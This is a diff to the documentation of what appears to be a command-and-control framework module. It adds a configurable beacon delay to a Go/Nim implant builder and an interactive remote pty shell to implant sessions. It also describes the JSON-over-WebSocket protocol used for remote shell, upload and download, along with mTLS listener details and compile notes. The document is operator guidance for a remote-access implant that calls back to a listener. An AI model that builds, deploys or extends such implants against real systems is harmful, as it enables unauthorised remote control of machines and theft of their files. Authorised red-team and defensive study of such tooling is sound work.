@@ -40,9 +40,16 @@ use ws-mtls-listener
 gen poly-builder                   # picks up the live listener profile
   set lang go
   set name corp-implant
+  set beacon 10                     # reconnect/beacon delay: seconds between
+                                    # reconnect attempts, baked into the binary
   run                              # artifact lands in YOUR cwd, registered with keep=True
 sessions                           # implants show up as wraith sessions on connect
-use <sid>                          # inner shell: shell / sysinfo / upload / download / die
+use <sid>                          # inner shell: shell / pty / sysinfo / upload / download / die
+  pty                              # INTERACTIVE shell, ssh-style RAW mode (go implants
+                                   # on linux): remote echo/history/Tab-completion,
+                                   # Ctrl+C passthrough, full-screen apps (vim, htop),
+                                   # terminal size follows your window (SIGWINCH).
+                                   # Ctrl+] returns to verbs (.q leaves pty mode)
 ```
 
 ## Dependencies (module-owned)
@@ -60,6 +67,8 @@ One JSON object per WebSocket text frame:
 
 - hello (implant → listener): `{"id","implant","os","arch","user","host","token"}`
 - command (listener → implant): `{"id","cmd":"shell|sysinfo|upload|download|die","arg"/"path","data"(b64)}`
+- pty (listener → implant, go/linux only): `{"id","cmd":"pty_open","arg":"<cols>,<rows>"}` · `{"cmd":"pty_in","data"(b64)}` · `{"cmd":"pty_sz","arg":"<cols>,<rows>"}`
+- pty stream (implant → listener): `{"id":0,"type":"pty_out","data"(b64)}` while output flows, then `{"id":0,"type":"pty_exit"}` when the shell ends — the pty is one-shot per `pty` verb and is killed automatically if the connection drops
 - reply: `{"id","type":"result","out"}` or `{"id","type":"dl","path","data"}`
 
 The profile published by `ws-mtls-listener` (`EIDOLON_SHELL.wraith_listener`)
@@ -75,7 +84,8 @@ sent over the wire that the implant could not have read from its own binary.
 - **Shared token on top**: a wrong token with a VALID client cert is logged as
   a `warn` (cert-theft signal), not a silent drop.
 - **Caps everywhere**: frames ≤ 4 MiB (`ws max_size`), download cap 4 MiB,
-  10 s hello window, 120 s shell exec timeout (Go), 5–8 s jittered reconnect.
+  10 s hello window, 120 s shell exec timeout (Go), reconnect jitter on a
+  `beacon`-seconds base baked by the builder (default 5 s).
 - **No temp artifacts**: builder output goes to the operator's cwd or an
   explicit `output` path, 0o700, registered with `keep=True` — the store's
   `/tmp|/var/tmp|/dev/shm|%TEMP%` refusal never has to fire.
@@ -86,8 +96,10 @@ sent over the wire that the implant could not have read from its own binary.
 
 ## Test matrix so far
 
-- Go implant: compile-verified for `GOOS=linux` and `GOOS=windows` (`go1.27`,
-  stdlib-only).
+- Go implant: compile-verified for `GOOS=linux` (amd64 + arm64, `pty_linux.go`) and
+  `GOOS=windows` (`pty_stub.go`) (`go1.27`, stdlib-only); `go vet` clean. The
+  pty verb needs a rebuilt + redeployed implant — older deployed builds answer
+  `pty` with `unknown verb` and only offer the one-shot `shell`.
 - Nim implant: source-reviewed (stdlib-only, manual WS framing, `CVerifyPeer`);
   compile it once with `nim c -d:release -d:ssl --opt:size` — the CI sandbox
   has no Nim toolchain.
